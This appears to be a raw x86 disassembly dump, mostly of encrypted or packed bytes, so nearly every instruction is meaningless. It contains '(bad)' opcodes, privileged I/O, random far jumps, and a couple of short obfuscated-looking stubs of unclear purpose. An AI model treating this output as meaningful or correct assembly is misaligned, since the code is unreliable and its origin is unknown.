  403c4e:	and    ebx,DWORD PTR [ecx+0x14]
  403c51:	pop    ds
  403c52:	ja     0x403c4e
  403c54:	xchg   ebp,esp
  403c56:	out    0x55,al
  403c58:	lods   al,BYTE PTR cs:[esi]
  403c5a:	dec    ecx
  403c5b:	add    bh,bl
  403c5d:	inc    esi
  403c5e:	call   0x83b1:0x937ceb48
  403c65:	icebp  
  403c66:	adc    eax,0xd4abed82
  403c6b:	mov    ebx,0x3207f25
  403c70:	push   ebx
  403c71:	push   ds
  403c72:	add    DWORD PTR [edi-0x7cb0eb39],esi
  403c78:	cld    
  403c79:	(bad)  
  403c7a:	iret   
  403c7b:	xor    eax,0xf9802d10
  403c80:	push   esp
  403c81:	arpl   sp,di
  403c83:	jmp    0x403c0f
  403c85:	push   edx
  403c86:	or     al,0xc1
  403c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c89:	sahf   
  403c8a:	cmp    esi,DWORD PTR [eax]
  403c8c:	push   esp
  403c8d:	sbb    DWORD PTR [ecx-0x7],esi
  403c90:	rol    DWORD PTR [esi+0x5b0a44de],0x74
  403c97:	push   cs
  403c98:	cs fs je 0x403cbe
  403c9c:	pop    ss
  403c9d:	ins    DWORD PTR es:[edi],dx
  403c9e:	mov    al,ds:0x9e1ea22c
  403ca3:	clc    
  403ca4:	xor    edi,edx
  403ca6:	cs cld 
  403ca8:	stc    
  403ca9:	jmp    0x7e2f048a
  403cae:	dec    edi
  403caf:	ja     0x403c51
  403cb1:	inc    esp
  403cb2:	loop   0x403d07
  403cb4:	les    esp,FWORD PTR [ecx-0x10440678]
  403cba:	loopne 0x403d1e
  403cbc:	fcmovbe st,st(6)
  403cbe:	xchg   ebp,eax
  403cbf:	jb     0x403cf8
  403cc1:	sbb    DWORD PTR [ebx-0x2b16e277],0x145c4a4d
  403ccb:	fild   QWORD PTR [esi-0x3f]
  403cce:	xchg   esp,eax
  403ccf:	jb     0x403c54
  403cd1:	test   BYTE PTR [edx+0x7689a8d3],ch
  403cd7:	or     BYTE PTR [esi+0x70082b3a],al
  403cdd:	(bad)  
  403cde:	fnstcw WORD PTR [esi]
  403ce0:	frstor [ebx]
  403ce2:	fcom   DWORD PTR [edx-0x51d02b1b]
  403ce8:	xor    eax,DWORD PTR [ebx-0x67]
  403ceb:	imul   ecx,DWORD PTR [esi-0x30],0x7dd1242f
  403cf2:	retf   
  403cf3:	xchg   ebx,eax
  403cf4:	fimul  DWORD PTR [esi-0x6f]
  403cf7:	stos   BYTE PTR es:[edi],al
  403cf8:	imul   edi,eax,0x5f
  403cfb:	or     al,0xe8
  403cfd:	les    esp,FWORD PTR [eax-0x13]
  403d00:	xchg   esp,eax
  403d01:	cwde   
  403d02:	jne    0x403d0e
  403d04:	jecxz  0x403d17
  403d06:	lahf   
  403d07:	retf   0x51a6
  403d0a:	call   0xcd2fc688
  403d0f:	loope  0x403d84
  403d11:	xchg   esp,eax
  403d12:	mov    bh,0x84
  403d14:	mov    bh,0xbc
  403d16:	test   DWORD PTR [ecx+eiz*4+0x6b],edx
  403d1a:	sbb    dh,0xbf
  403d1d:	cmp    DWORD PTR [ebp+0x5b],0x6f7b178c
  403d24:	imul   esp,DWORD PTR [edx+eax*4],0x5c
  403d28:	xchg   ebp,eax
  403d29:	std    
  403d2a:	icebp  
  403d2b:	mov    BYTE PTR ds:0x34a01c64,dh
  403d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d32:	inc    edx
  403d33:	ficom  WORD PTR [eax+0x564c4bca]
  403d39:	add    eax,0x2971959a
  403d3e:	aas    
  403d3f:	ror    BYTE PTR [bp+si],0x5
  403d43:	adc    eax,0x2741db4a
  403d48:	arpl   WORD PTR [edx+0x29afd981],cx
  403d4e:	stc    
  403d4f:	cli    
  403d50:	(bad)  
  403d51:	mov    BYTE PTR [eax+0x24d7f1e2],dl
  403d57:	nop
  403d58:	xor    BYTE PTR [ecx-0x3f],dl
  403d5b:	lahf   
  403d5c:	sub    DWORD PTR [edx],edi
  403d5e:	jmp    0x403d7d
  403d60:	sub    ebx,ecx
  403d62:	fcmovnu st,st(1)
  403d64:	cmp    ch,dl
  403d66:	cwde   
  403d67:	or     DWORD PTR [ebp+ebp*4+0x4db0b2a4],esi
  403d6e:	shl    BYTE PTR [ebx],cl
  403d70:	pop    ds
  403d71:	xchg   esi,eax
  403d72:	sbb    eax,eax
  403d74:	sbb    eax,0x3c49f092
  403d79:	jecxz  0x403da2
  403d7b:	scas   eax,DWORD PTR es:[edi]
  403d7c:	mov    bh,0xd5
  403d7e:	jl     0x403de1
  403d80:	xor    eax,0x82512d8d
  403d85:	sub    ah,BYTE PTR [edi-0x7ebc10bd]
  403d8b:	sti    
  403d8c:	je     0x403d55
  403d8e:	inc    ebx
  403d8f:	mov    ecx,0x83275e84
  403d94:	inc    ecx
  403d95:	xor    BYTE PTR [edi-0x42],dl
  403d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d99:	or     cl,ah
  403d9b:	fadd   QWORD PTR [edi]
  403d9d:	inc    esp
  403d9e:	sbb    ch,al
  403da0:	inc    edi
  403da1:	(bad)  
  403da2:	rcr    al,1
  403da4:	jle    0x403d85
  403da6:	pop    eax
  403da7:	or     bh,BYTE PTR [ebx-0x1b]
  403daa:	or     al,0x5e
  403dac:	aaa    
  403dad:	test   eax,0xd7017d7e
  403db2:	and    esp,ecx
  403db4:	inc    eax
  403db5:	lea    eax,[edx]
  403db7:	jne    0x403d7f
  403db9:	mov    al,0xec
  403dbb:	(bad)  
  403dbc:	test   al,0x69
  403dbe:	mov    dh,bl
  403dc0:	rol    BYTE PTR [esi],cl
  403dc2:	xchg   ecx,eax
  403dc3:	pop    eax
  403dc4:	cmp    al,0x4
  403dc6:	fs dec edi
  403dc8:	pushf  
  403dc9:	mov    cl,0x3d
  403dcb:	in     eax,0x1b
  403dcd:	stos   DWORD PTR es:[edi],eax
  403dce:	or     al,0x84
  403dd0:	in     eax,dx
  403dd1:	xor    al,0xa2
  403dd3:	mov    eax,0x9f876646
  403dd8:	cmc    
  403dd9:	mov    WORD PTR [edi+0x36],cs
  403ddc:	sub    BYTE PTR [edi+edi*2-0x7],dh
  403de0:	jmp    0x6d260aed
  403de5:	push   ebp
  403de6:	dec    ebp
  403de7:	out    dx,al
  403de8:	mov    eax,ds:0xcd7df61d
  403ded:	test   al,0xd
  403df0:	imul   ecx,DWORD PTR [eax],0xffffffaa
  403df3:	ret    0x224b
  403df6:	push   ecx
  403df7:	popa   
  403df8:	cmc    
  403df9:	xchg   ebx,eax
  403dfa:	mov    DWORD PTR [ebx+ebx*4-0x6c],ecx
  403dfe:	add    eax,0x4da15051
  403e03:	outs   dx,BYTE PTR ds:[esi]
  403e04:	add    BYTE PTR [edx],0x6
  403e07:	out    0x82,eax
  403e09:	addr16 mov ebp,0xc07cde8b
  403e0f:	or     eax,0xd202216
  403e14:	mov    DWORD PTR [esi],esi
  403e16:	fnstcw WORD PTR [ecx-0x9763564]
  403e1c:	arpl   WORD PTR [ecx+0x2d],bp
  403e1f:	jmp    0x403e3d
  403e21:	imul   esp,esp,0xffffffe7
  403e24:	out    0x7e,al
  403e26:	loope  0x403dda
  403e28:	dec    ebp
  403e29:	pop    ds
  403e2a:	adc    ecx,ecx
  403e2c:	scas   al,BYTE PTR es:[edi]
  403e2d:	cdq    
  403e2e:	je     0x403e48
  403e30:	push   ebp
  403e31:	jecxz  0x403db4
  403e33:	call   0x4e32:0xe1bb1c9e
  403e3a:	sbb    eax,0x7c5d84c6
  403e3f:	pusha  
  403e40:	sbb    eax,0xa1b160
  403e45:	(bad)  
  403e46:	gs jbe 0x403ebd
  403e49:	(bad)  
  403e4a:	mov    ds:0x978802aa,al
  403e4f:	pop    ebp
  403e50:	int3   
  403e51:	sub    ebx,DWORD PTR [ecx]
  403e53:	pop    esp
  403e54:	idiv   BYTE PTR [edx]
  403e56:	mov    ds:0x61a3c1cc,al
  403e5b:	push   edx
  403e5c:	or     eax,esi
  403e5e:	pushf  
  403e5f:	ret    
  403e60:	ss mov ebx,0x9e8d6197
  403e66:	bnd jmp 0x403e9f
  403e69:	push   ds
  403e6a:	stos   DWORD PTR es:[edi],eax
  403e6b:	mov    bh,0x9c
  403e6d:	stc    
  403e6e:	sbb    eax,0xddb5690c
  403e73:	adc    eax,0x312592e7
  403e78:	icebp  
  403e79:	pusha  
  403e7a:	mov    dh,0xd0
  403e7c:	xor    BYTE PTR [ecx],bh
  403e7e:	xchg   ebp,eax
  403e7f:	inc    esp
  403e80:	dec    ebp
  403e81:	out    0xef,al
  403e83:	sahf   
  403e84:	and    edi,DWORD PTR [ebx+0x4c]
  403e87:	retf   0xe56f
  403e8a:	xchg   ebp,eax
  403e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e8c:	mov    al,0x31
  403e8e:	(bad)  
  403e90:	addr16 jne 0x403e8b
  403e93:	fidiv  WORD PTR [esi+edx*4-0x7128d8b9]
  403e9a:	sub    DWORD PTR [edx],edx
  403e9c:	call   0x10e536cf
  403ea1:	lods   al,BYTE PTR ds:[esi]
  403ea2:	stos   DWORD PTR es:[edi],eax
  403ea3:	jne    0x403e6b
  403ea5:	test   al,0x3d
  403ea7:	fcomp  DWORD PTR [ecx]
  403ea9:	mov    eax,0xbe6a2827
  403eae:	or     ch,BYTE PTR [ebx+0xa]
  403eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eb2:	lods   al,BYTE PTR ds:[esi]
  403eb3:	std    
  403eb4:	jbe    0x403e44
  403eb6:	outs   dx,BYTE PTR ds:[esi]
  403eb7:	dec    ebx
  403eb8:	in     eax,dx
  403eb9:	pcmpeqd mm7,QWORD PTR [ecx-0xb158bdf]
  403ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ec1:	xchg   DWORD PTR [ebp-0x23],edi
  403ec4:	add    edx,edi
  403ec6:	ret    
  403ec7:	xchg   esp,eax
  403ec8:	ds push 0x1057d627
  403ece:	add    eax,esp
  403ed0:	(bad)  
  403ed1:	lahf   
  403ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ed3:	aam    0xf
  403ed5:	dec    edx
  403ed6:	into   
  403ed7:	mov    al,dh
  403ed9:	jge    0x403f4b
  403edb:	std    
  403edc:	sub    BYTE PTR [edx+0x55ababa6],dh
  403ee2:	ds push ds
  403ee4:	cdq    
  403ee5:	jno    0x403ea2
  403ee7:	mov    edi,0x90f9403e
  403eec:	addr16 leave 
  403eee:	icebp  
  403eef:	pop    edx
  403ef0:	and    BYTE PTR [ebx-0x69a6871a],dl
  403ef6:	cmp    BYTE PTR [ebx-0xa],bl
  403ef9:	dec    ebx
  403efa:	jno    0x403e87
  403efc:	or     al,0x9
  403efe:	push   0x3c
  403f00:	cs test eax,0xf7919876
  403f06:	pushf  
  403f07:	mov    ds:0x3ea9129,al
  403f0c:	add    DWORD PTR [ecx],ebx
  403f0e:	sbb    eax,0x4281df
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x42825f
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x4283eb,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x4282a7,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx-0x3ca07b44],ch
  403f58:	jl     0x403f28
  403f5a:	xlat   BYTE PTR ds:[ebx]
  403f5b:	sbb    BYTE PTR [eax],bl
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    BYTE PTR [edi],cl
  403f62:	inc    esi
  403f63:	ret    0xd6e0
  403f66:	out    dx,eax
  403f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f68:	arpl   WORD PTR [ebp-0x3cd259e8],sp
  403f6e:	adc    cl,BYTE PTR [ebx]
  403f70:	(bad)  [ebx-0x68d0f17f]
  403f76:	popa   
  403f77:	aam    0xe6
  403f79:	das    
  403f7a:	lods   al,BYTE PTR ds:[esi]
  403f7b:	popa   
  403f7c:	mov    ds:0x37baac92,eax
  403f81:	and    ebp,ebp
  403f83:	fld    QWORD PTR ds:0xbc2369b0
  403f89:	call   0xc309:0xd89a25c7
  403f90:	jne    0x403f7d
  403f92:	cs retf 
  403f94:	adc    eax,0xbdc131d0
  403f99:	je     0x403ff1
  403f9b:	mov    ah,0xe
  403f9d:	in     eax,0x31
  403f9f:	push   ecx
  403fa0:	push   cs
  403fa1:	mov    bl,0xce
  403fa3:	ins    BYTE PTR es:[edi],dx
  403fa4:	jo     0x403f88
  403fa6:	es sub al,0x1
  403fa9:	push   ss
  403faa:	ins    DWORD PTR es:[edi],dx
  403fab:	xchg   ebx,eax
  403fac:	dec    esi
  403fad:	xor    ebp,DWORD PTR [edi+0x7ee18bbd]
  403fb3:	mov    dh,0xd9
  403fb5:	pop    ecx
  403fb6:	jb     0x403f46
  403fb8:	retf   
  403fb9:	or     BYTE PTR [ebx+0x4d87977b],0xa8
  403fc0:	mov    esp,ebp
  403fc2:	loope  0x404013
  403fc4:	push   ebp
  403fc5:	push   edx
  403fc6:	bound  ebx,QWORD PTR fs:[edx+0x191d6418]
  403fcd:	shl    bh,cl
  403fcf:	(bad)  
  403fd0:	in     al,dx
  403fd1:	out    0x32,eax
  403fd3:	mul    DWORD PTR [ebx+0x59]
  403fd6:	pavgw  mm5,QWORD PTR [edi+0x1]
  403fda:	or     bh,BYTE PTR [ebx+0x50ae633d]
  403fe0:	stos   BYTE PTR es:[edi],al
  403fe1:	sbb    dl,al
  403fe3:	rcr    DWORD PTR [edi-0x79],0xda
  403fe7:	lods   al,BYTE PTR ds:[esi]
  403fe8:	inc    esi
  403fe9:	jb     0x403f91
  403feb:	sub    esi,DWORD PTR [esi+esi*2+0x29]
  403fef:	adc    BYTE PTR [ebp+0x79c252bd],ch
  403ff5:	mov    edx,0xee8ca46
  403ffa:	stos   BYTE PTR es:[edi],al
  403ffb:	sbb    al,0xd
  403ffd:	test   dh,cl
  403fff:	call   0x958f:0xf3310a3b
  404006:	add    ch,BYTE PTR [eax-0x7a]
  404009:	mov    bl,0x9b
  40400b:	jns    0x404063
  40400d:	repz aam 0x1f
  404010:	adc    cl,BYTE PTR [esp+ebp*1-0x2]
  404014:	popa   
  404015:	pop    ecx
  404016:	pop    ebx
  404017:	fst    QWORD PTR [edi]
  404019:	and    BYTE PTR [edx-0x6c],dl
  40401c:	xor    BYTE PTR [ebp+0x6c3ef76c],dh
  404022:	pop    eax
  404023:	sub    eax,0xe63b6843
  404028:	jle    0x40409d
  40402a:	sti    
  40402b:	in     al,dx
  40402c:	fs jo  0x404072
  40402f:	xor    BYTE PTR [ebx+0x4fb2bf05],dh
  404035:	inc    esi
  404036:	imul   esi,DWORD PTR [edx-0x12476ed4],0x6c24e09b
  404040:	(bad)  
  404041:	xchg   esp,eax
  404042:	cmc    
  404043:	or     eax,0x44d5cbe5
  404048:	cwde   
  404049:	fcomp  QWORD PTR [eax]
  40404b:	iret   
  40404c:	scas   eax,DWORD PTR es:[edi]
  40404d:	jge    0x40407b
  40404f:	lods   eax,DWORD PTR ds:[esi]
  404050:	jmp    0x63ed:0x397be6ba
  404057:	adc    dl,ah
  404059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40405a:	adc    BYTE PTR [edx],cl
  40405c:	js     0x403fe8
  40405e:	cmp    edi,DWORD PTR ds:0xb3f32859
  404064:	sbb    DWORD PTR [edi],eax
  404066:	aaa    
  404067:	out    0xe5,al
  404069:	add    eax,0xf10bcf10
  40406e:	icebp  
  40406f:	mov    ds:0x58b4adc9,eax
  404074:	hlt    
  404075:	sub    al,0x87
  404077:	push   0xffffffe5
  404079:	(bad)  
  40407a:	jmp    0xe25780ab
  40407f:	pop    ebx
  404080:	aaa    
  404081:	lds    edi,FWORD PTR [esi]
  404083:	xchg   ebp,eax
  404084:	mov    eax,0xdcaf90da
  404089:	es aad 0xb6
  40408c:	rcl    ch,cl
  40408e:	(bad)  
  404090:	imul   BYTE PTR [ebx]
  404092:	arpl   bx,dx
  404094:	inc    ebp
  404095:	les    esp,FWORD PTR [esi]
  404097:	ret    
  404098:	sti    
  404099:	ja     0x4040e6
  40409b:	jae    0x404094
  40409d:	int3   
  40409e:	and    al,0xd1
  4040a0:	int3   
  4040a1:	cwde   
  4040a2:	pop    eax
  4040a3:	push   0xfffffffc
  4040a5:	popa   
  4040a6:	push   eax
  4040a7:	aaa    
  4040a8:	push   es
  4040a9:	pusha  
  4040aa:	dec    esp
  4040ab:	test   al,0x2
  4040ad:	jb     0x4040a2
  4040af:	jl     0x40412d
  4040b1:	xor    eax,0x4fba37a3
  4040b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040b7:	inc    ecx
  4040b8:	imul   esp,esi,0x9451fa85
  4040be:	sbb    ebp,DWORD PTR [edi-0x69d09784]
  4040c4:	and    al,0xfe
  4040c6:	inc    edi
  4040c7:	mov    ah,0x29
  4040c9:	fdivr  DWORD PTR [edx]
  4040cb:	(bad)  
  4040cc:	pop    ebp
  4040cd:	or     dl,bl
  4040cf:	adc    ecx,edi
  4040d1:	add    eax,0xdf00692b
  4040d6:	bound  esp,QWORD PTR ds:0x367845b6
  4040dc:	push   es
  4040dd:	push   ss
  4040de:	xlat   BYTE PTR ds:[ebx]
  4040df:	lods   al,BYTE PTR ds:[esi]
  4040e0:	nop
  4040e1:	(bad)  
  4040e2:	loop   0x40411a
  4040e4:	add    ah,BYTE PTR [eax+0x4]
  4040e7:	arpl   WORD PTR [esi-0x59],sp
  4040ea:	cdq    
  4040eb:	daa    
  4040ec:	or     DWORD PTR [eax+0x70c54e45],ebx
  4040f2:	pusha  
  4040f3:	xchg   ebx,eax
  4040f4:	lods   eax,DWORD PTR ds:[esi]
  4040f5:	add    al,0x9e
  4040f7:	mov    esi,DWORD PTR [esp+eax*8+0x7f3f8a1]
  4040fe:	(bad)  
  4040ff:	addr16 out 0xd0,al
  404102:	add    al,BYTE PTR [ebp-0x70]
  404105:	pusha  
  404106:	into   
  404107:	test   DWORD PTR [edi-0x3054e4cb],esi
  40410d:	mov    ebp,0xafaa61d6
  404112:	add    dh,BYTE PTR [edx-0x1b]
  404115:	inc    esp
  404116:	js     0x4040dc
  404118:	cmp    BYTE PTR [edi+edi*1+0x5f],ah
  40411c:	cmp    DWORD PTR [ebx+0x19],ecx
  40411f:	adc    BYTE PTR [eax+0x2fdc1909],dh
  404125:	(bad)  
  404126:	test   al,0x7c
  404128:	dec    ebx
  404129:	xor    BYTE PTR [edx-0x3d854bf1],dl
  40412f:	popa   
  404130:	sbb    DWORD PTR [edi+0x49],ecx
  404133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404134:	or     BYTE PTR [ecx-0x79d9c28d],0x22
  40413b:	loop   0x4040ec
  40413d:	pop    ebx
  40413e:	jnp    0x40416b
  404140:	xor    edi,ebp
  404142:	xor    DWORD PTR [ebp+ebp*2-0x1],0x1a
  404147:	movlhps xmm7,xmm6
  40414a:	sub    cl,BYTE PTR [ecx]
  40414c:	or     bh,bl
  40414e:	mov    al,0x1c
  404150:	jnp    0x40419a
  404152:	(bad)  
  404153:	arpl   dx,bx
  404155:	shr    DWORD PTR cs:[di+0x7688],cl
  40415b:	mov    es,WORD PTR [edx+0x9]
  40415e:	inc    ecx
  40415f:	(bad)  
  404160:	loopne 0x404117
  404162:	ds dec ebp
  404164:	push   ebx
  404165:	clc    
  404166:	jmp    0xea3e1a2d
  40416b:	inc    ecx
  40416c:	cli    
  40416d:	inc    esi
  40416e:	bnd jg 0x404166
  404171:	gs jge 0x40411b
  404174:	jl     0x4041bf
  404176:	(bad)  
  404177:	lds    esp,FWORD PTR [edx+0x20c3d9f1]
  40417d:	push   esp
  40417e:	rcl    bh,1
  404180:	push   ebp
  404181:	(bad)  
  404182:	add    dl,ah
  404184:	or     ebx,DWORD PTR ds:0x55affd49
  40418a:	jae    0x4041ef
  40418c:	and    bl,BYTE PTR [edi]
  40418e:	inc    esi
  40418f:	ins    DWORD PTR es:[edi],dx
  404190:	xchg   DWORD PTR [edx+0x1ab14af2],esp
  404196:	push   ebx
  404197:	mov    ecx,?
  404199:	mov    al,BYTE PTR [ecx]
  40419b:	sub    al,0x4a
  40419d:	lea    edx,[edx]
  40419f:	fst    DWORD PTR ds:[edx+ebx*8]
  4041a3:	mov    bl,0x50
  4041a5:	test   al,0x69
  4041a7:	lods   al,BYTE PTR ds:[esi]
  4041a8:	mov    ds:0x84bc1ade,al
  4041ad:	adc    eax,0x4a2b0394
  4041b2:	mov    dh,0x6a
  4041b4:	arpl   WORD PTR [esi],cx
  4041b6:	inc    esi
  4041b7:	fisttp QWORD PTR gs:[edx+ecx*8-0x45d66526]
  4041bf:	push   cs
  4041c0:	outs   dx,DWORD PTR ds:[esi]
  4041c1:	lds    ebx,FWORD PTR [ebp+0x6d]
  4041c4:	faddp  st(2),st
  4041c6:	sbb    ebx,edi
  4041c8:	popf   
  4041c9:	dec    edx
  4041ca:	jge    0x40420d
  4041cc:	adc    eax,0xa4623407
  4041d1:	add    ebp,ebp
  4041d3:	(bad)  
  4041d4:	loop   0x4041a0
  4041d6:	pushf  
  4041d7:	mov    DWORD PTR [eax+0x0],edx
  4041da:	sub    esi,esp
  4041dc:	(bad)  
  4041dd:	(bad)  
  4041de:	mov    al,0xfe
  4041e0:	xchg   edi,eax
  4041e1:	push   ebx
  4041e2:	clc    
  4041e3:	inc    ebx
  4041e4:	mov    bh,0x99
  4041e6:	cmp    eax,0x8da1bf0c
  4041eb:	cmp    eax,DWORD PTR [edx]
  4041ed:	xchg   esp,ebp
  4041ef:	in     eax,0xd9
  4041f1:	stos   BYTE PTR es:[edi],al
  4041f2:	mov    al,0xfe
  4041f4:	sti    
  4041f5:	push   edx
  4041f6:	xchg   ecx,eax
  4041f7:	imul   esp,DWORD PTR [ebx+0x7d],0xffffffa8
  4041fb:	js     0x404254
  4041fd:	xchg   ebx,eax
  4041fe:	mov    cl,0x6b
  404200:	sbb    edx,ecx
  404202:	mov    ?,WORD PTR [edi]
  404204:	ficomp DWORD PTR [edx-0x69]
  404207:	int3   
  404208:	or     eax,0x9a981ada
  40420d:	je     0x4041fc
  40420f:	outs   dx,DWORD PTR ds:[esi]
  404210:	outs   dx,BYTE PTR ds:[esi]
  404211:	dec    ecx
  404212:	mov    ?,eax
  404214:	mov    bh,0x48
  404216:	xor    dl,0x77
  404219:	loope  0x404227
  40421b:	inc    edi
  40421c:	stos   DWORD PTR es:[edi],eax
  40421d:	mov    esi,0x7d130a87
  404222:	mov    al,ds:0x860a8e0e
  404227:	add    BYTE PTR [ecx+0x7793d69d],dh
  40422d:	inc    dx
  40422f:	mov    edx,0xbba263b5
  404234:	mov    ss,WORD PTR [ebp+0x2e]
  404237:	ret    0x5fda
  40423a:	push   esp
  40423b:	sub    edx,DWORD PTR [ecx]
  40423d:	lds    ebp,FWORD PTR [ebx]
  40423f:	and    eax,0xd35bcb87
  404244:	popf   
  404245:	(bad)  
  404246:	les    esp,FWORD PTR [edi]
  404248:	xchg   ecx,eax
  404249:	sbb    cl,BYTE PTR [eax]
  40424b:	mov    al,0xd8
  40424d:	test   eax,0x59109a06
  404252:	retf   
  404253:	mov    edx,0x3ce063c8
  404258:	das    
  404259:	xchg   DWORD PTR [ecx+0xc90de24],esi
  40425f:	jo     0x404223
  404261:	dec    ebx
  404262:	jns    0x4042e0
  404264:	ret    
  404265:	sahf   
  404266:	xchg   ebp,eax
  404267:	scas   eax,DWORD PTR es:[edi]
  404268:	out    dx,al
  404269:	adc    ch,bl
  40426b:	dec    ebp
  40426c:	mov    ah,0x22
  40426e:	imul   esi,DWORD PTR [ebp+0xb],0x98444704
  404275:	js     0x4041fd
  404277:	ins    BYTE PTR es:[edi],dx
  404278:	xor    BYTE PTR [ecx],al
  40427a:	inc    esp
  40427b:	in     eax,0xf9
  40427d:	add    BYTE PTR cs:0x6031ce90,bl
  404284:	dec    esp
  404285:	inc    esi
  404286:	jmp    0xa9d4:0x6d48979f
  40428d:	addr16 stc 
  40428f:	into   
  404290:	imul   ebx,DWORD PTR [ecx-0x6],0xffffffab
  404294:	ins    BYTE PTR es:[edi],dx
  404295:	mov    al,0x7
  404297:	sub    ch,BYTE PTR [edi-0x18]
  40429a:	mov    ds:0x8bdd3332,al
  40429f:	out    dx,eax
  4042a0:	sub    ebp,DWORD PTR [esi]
  4042a2:	imul   edx,DWORD PTR [ecx-0x5a],0x3d
  4042a6:	mov    dh,0x7b
  4042a8:	xchg   ecx,eax
  4042a9:	xchg   esp,eax
  4042aa:	mov    ebp,0x234c89a9
  4042af:	sbb    BYTE PTR [ebx+0x2e],bl
  4042b2:	sub    DWORD PTR [esi-0x2f],ebp
  4042b5:	icebp  
  4042b6:	arpl   bp,si
  4042b8:	mov    cl,0xc5
  4042ba:	xchg   ecx,eax
  4042bb:	adc    edx,edx
  4042bd:	jo     0x40430e
  4042bf:	fdiv   QWORD PTR [ecx-0x63]
  4042c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042c3:	cdq    
  4042c4:	pop    ebx
  4042c5:	icebp  
  4042c6:	sbb    eax,DWORD PTR [edx+0x7a]
  4042c9:	jecxz  0x40427a
  4042cb:	sub    al,0x79
  4042cd:	in     eax,dx
  4042ce:	jl     0x404254
  4042d0:	call   0x3564b839
  4042d5:	fisubr DWORD PTR [ebp-0xc]
  4042d8:	push   eax
  4042d9:	lods   eax,DWORD PTR ds:[esi]
  4042da:	wbinvd 
  4042dc:	mov    dh,0x26
  4042de:	xchg   ebx,eax
  4042df:	retf   0x422f
  4042e2:	sub    ebp,DWORD PTR [edx+0x689ef2b8]
  4042e8:	push   0x8cd1e6d9
  4042ed:	pop    esp
  4042ee:	out    dx,al
  4042ef:	add    eax,0x4d94e3b
  4042f4:	fmul   st,st(3)
  4042f6:	jno    0x4042c9
  4042f8:	cmp    eax,0x11dc2f92
  4042fd:	in     eax,dx
  4042fe:	xchg   edi,eax
  4042ff:	cli    
  404300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404301:	xchg   ebx,eax
  404302:	leave  
  404303:	and    bl,al
  404305:	(bad)  
  404306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404307:	pop    ebx
  404308:	lock adc eax,0x6ee7bcd5
  40430e:	mov    ebp,0x13b86cb1
  404313:	sub    ah,BYTE PTR [ecx+0x57]
  404316:	sbb    al,0xb
  404318:	ins    BYTE PTR es:[edi],dx
  404319:	stos   BYTE PTR es:[edi],al
  40431a:	push   esp
  40431b:	and    al,0x7e
  40431d:	(bad)  
  40431e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40431f:	push   esi
  404320:	dec    ecx
  404321:	add    DWORD PTR [ebx+0x1d210453],ecx
  404327:	stos   DWORD PTR es:[edi],eax
  404328:	add    BYTE PTR [edx+0x0],0x33
  40432c:	iret   
  40432d:	or     edx,DWORD PTR ds:0x4282db
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x428357
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428297
  404344:	and    DWORD PTR ds:0x4283f7,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x4283df
  404355:	sbb    DWORD PTR ds:0x4282eb,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	xor    al,0xe7
  404371:	loope  0x4043f1
  404373:	push   ebp
  404374:	iret   
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [edi+0x26],cl
  40437d:	sub    eax,0xb01a82f9
  404382:	xchg   esi,eax
  404383:	pop    es
  404384:	repz or eax,0x622a6049
  40438a:	cli    
  40438b:	popa   
  40438c:	int    0x1f
  40438e:	mov    bl,0x1d
  404390:	dec    eax
  404391:	mov    al,0xe1
  404393:	in     eax,dx
  404394:	pusha  
  404395:	mov    ?,WORD PTR [eax]
  404397:	mov    ah,0x6e
  404399:	sub    eax,0xe2468d2f
  40439e:	icebp  
  40439f:	inc    esi
  4043a0:	stos   DWORD PTR es:[edi],eax
  4043a1:	scas   eax,DWORD PTR es:[edi]
  4043a2:	add    edx,ecx
  4043a4:	xlat   BYTE PTR ds:[ebx]
  4043a5:	push   bx
  4043a7:	xor    BYTE PTR [esp+ebp*2-0x33],al
  4043ab:	pusha  
  4043ac:	add    eax,0xbbb2a9f3
  4043b1:	push   edx
  4043b2:	iret   
  4043b3:	xchg   ebx,eax
  4043b4:	les    esi,FWORD PTR [ecx-0x33cf200f]
  4043ba:	xor    DWORD PTR [edx+0x5136a859],edx
  4043c0:	inc    esp
  4043c1:	add    DWORD PTR [eax],esp
  4043c3:	mov    cl,0xa
  4043c5:	ins    BYTE PTR es:[edi],dx
  4043c6:	mov    bl,0xe3
  4043c8:	and    al,0x32
  4043ca:	jg     0x4043b6
